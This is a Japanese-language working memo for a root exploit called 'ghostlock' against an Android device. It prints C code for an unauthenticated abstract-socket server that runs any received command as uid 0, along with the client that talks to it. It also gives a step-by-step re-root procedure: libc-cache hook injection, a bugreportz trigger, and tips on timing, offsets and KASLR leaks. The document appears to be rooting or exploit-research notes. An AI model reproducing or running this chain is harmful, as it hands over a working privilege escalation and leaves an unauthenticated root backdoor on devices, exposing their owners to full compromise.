# ROOTSHELL 備忘録 — `su` / `rsh` / `gl_su` と root コマンド実行（MRX-W09）

Date: 2026-09-26.  Source of truth: `session_20260926_stabilize_oneshot/src/ghostlock_mrx_e.c`
（ビルド: `ghostlock_e_lr2` / `ghostlock_e`）。README(公開) §6/§13/§14、`MRX_W09_GHOSTLOCK_FACTS.md` と整合。

------------------------------------------------------------------------------------------
## 1. 結論（今日の謎の答え）
- **`su` と `rsh` に特権差は無い**。どちらも「クライアントモード」に入る**名前**にすぎない。
- root になれるのは「**実体が `ghostlock_e`（クライアント）で、abstract socket `\0gl_su` に接続できる**」ものだけ。
- 端末の `/data/local/tmp/rsh` は**旧 `/system/bin/sh` の 4755 コピー**（`/data` は `nosuid`）→
  setuid が効かず **uid=2000** のまま。これが「`rsh -c id` が 2000 になる」理由。
- 正しい実行は **`/data/local/tmp/su -c '...'`**（`su` は `ghostlock_e` への symlink）または
  **`/data/local/tmp/ghostlock_e --rshcli '...'`**。

------------------------------------------------------------------------------------------
## 2. クライアントモード（dispatch）
`ghostlock_mrx_e.c:3314-3327`
```c
{ const char*bn=strrchr(argv[0],'/'); bn=bn?bn+1:argv[0];
  if(!strcmp(bn,"rsh")||!strcmp(bn,"su")||(argc>1&&!strcmp(argv[1],"--rshcli"))){
      const char*cmd=NULL;
      for(int i=1;i+1<argc;i++) if(!strcmp(argv[i],"-c")){ cmd=argv[i+1]; break; }
      if(!cmd) cmd=(argc>1)?argv[argc-1]:"id";
      int s=socket(AF_UNIX,SOCK_STREAM,0);
      struct sockaddr_un a; memset(&a,0,sizeof(a)); a.sun_family=AF_UNIX; strcpy(a.sun_path+1,"gl_su");
      if(connect(s,(struct sockaddr*)&a,sizeof(a))){ write(2,"rsh: no ghostlock root server (run the exploit first)\n",53); return 1; }
      write(s,cmd,strlen(cmd)); shutdown(s,SHUT_WR);
      ... read reply to stdout ...
}}
```
- 判定は **argv[0] の basename が `rsh`/`su`**、または **argv[1]=="--rshcli"**。
- `-c CMD` を送る。`-c` が無ければ**最後の引数**を送る。
- **エラー接頭辞は `rsh:` 固定**（argv[0] が `su` でも `rsh:` と出る）→「su 経由なのに rsh: …」は正常。

## 3. root サーバ `su_server()`
`ghostlock_mrx_e.c:2976-2992`
```c
bind(..., "\0gl_su"); listen(s,16);
for(;;){ int c=accept(...); char cmd[1024]; read(c,cmd,1023);
         pid_t g=fork();
         if(g==0){ dup2(c,0/1/2); if(!gl_broker(cmd,1)) execl("/system/bin/sh","sh","-c",cmd,NULL); _exit(127); }
         close(c); waitpid(g,NULL,0); }
```
- **リクエストごとに fork**し、その子が**サーバ自身の uid（shield-free root タスク＝uid 0）**で `/system/bin/sh -c cmd` を exec。
- クライアント認証は無い。コマンド長は **1024B 未満**。
- 先頭が `GL` のコマンドは `gl_broker()`（`GLCAP` / `GLMOUNT` / `GLUMOUNT`）が横取り（`glboot.sh` の mount 経路）。
  ⇒ **通常コマンドを `GL` で始めない**。

## 4. 正しい root コマンド実行
| 方法 | コマンド | 条件 |
|---|---|---|
| symlink `su` | `/data/local/tmp/su -c 'id'` | `su` が `ghostlock_e` への symlink/コピー（**現状これが確実**） |
| argv 明示 | `/data/local/tmp/ghostlock_e --rshcli 'id'` | argv[0] 名に依存せず常に可 |
| `rsh` | `/data/local/tmp/rsh -c 'id'` | `rsh` が **ghostlock_e のコピー/symlink** のときのみ。`/system/bin/sh` コピーでは不可 |
| `-c` 省略 | `su 'id -u'` | 最後の argv を送る |

- サーバ起動確認: `/data/local/tmp/su -c true` の戻り 0（`glboot.sh` と同じ）。
- 実測（2026-09-26）: `/data/local/tmp/su -c id` → **uid=0(root) context=u:r:shell:s0**、
  `ghostlock_e --rshcli "id -u"` → **0**。

------------------------------------------------------------------------------------------
## 5. 正しいエンドツーエンド再root手順
```sh
# 0) /data/local/tmp に素材: shellcode.bin, glboot.sh, gms_setup.sh, ghostlock_e, gms_stage/
# 1) enabler を張る（RAM: libc キャッシュ書込み）
inject_hook place 0x84000 <payload_size-4> 0x7a3d8    # ★ payload長 - 4（772Bなら 0x300）
inject_hook hook  0x7a3d4 0x84000
# 2) 1回だけトリガ（= 設定→開発者向け→「バグレポートを取得」と同じ経路）
nohup /system/bin/bugreportz &
# 3) perf==-1 を待ち、root を確認
su -c true && su -c id
```
- payload は自動で `glboot.sh`（→ `ghostlock_e --root-gms`）or `root_restore.sh`（→ `--root`）を実行。

## 6. 落とし穴（再発防止）
1. **`place` の第2引数は `payload_size - 4`**（末尾4Bが branch-back スロット）。誤ると loader の `b .` が残りハング。
   - 正例: payload 772B → `0x300`。誤例: `0x244`（別世代の値）。
2. **同一ブートで exploit を2回走らせない**（実測リセット）。`inject_hook restore` も同ブートで2回禁止。
3. **stale marker `.glp0`/`.glp2`/`.glboot.<btime>` を掃除**（残ると payload が `O_EXCL` EEXIST で return→復元不能）。
4. **perf==-1 の前に exploit を起動しない**（KASLR leak 失敗で 120s 待ち→失敗）。
5. **`rsh` の実体を確認**: 正しければサーバ停止中に `rsh: no ghostlock root server` を出す。`/system/bin/sh` コピーだと普通に shell が動く。
   `cmp /data/local/tmp/rsh /data/local/tmp/ghostlock_e` で判定。

## 7. モード（shield-free 既定）
- **shield-free**: `--root` / `--root-gms` / `--root2` / `--root-gms2`（`g_shieldfree=1`, `ghostlock_mrx_e.c:4796-4800`）。
- **旧シールド（pid-0 landmine）**: `--root-old` / `--root-gms-old` / `--simple` / `--cede` / `--full`。
  - pid-0 タスクは exit で kernel panic（`Attempted to kill the idle task`）。**使わない**。
- `--legalroot` / `--endgame3` / `--freeze` は shield-free の部品。
- 端末の `ghostlock_e` は **shield-free 既定**（`--simple` を使う旧 `reroot.sh` は使わない）。

## 8. 参考（実測・出典）
- `publish/ghostlock-mrx-w09/docs/session_20260926/STATUS_20260926.md` L10/L15/L16/L19
- `publish/ghostlock-mrx-w09-gms/docs/TRIGGER_AND_PCLESS.md` L37-52（トリガは `dumpstate`(uid0) を新規起動させる `bugreportz`）
- `publish/ghostlock-mrx-w09/README.md` §13.1（place=payload_size-4, +36s）/ §13.2(4)(5)（marker/二重実行）
- `binder_uaf/session_20260922/MRX_W09_GHOSTLOCK_FACTS.md`（9an 系）
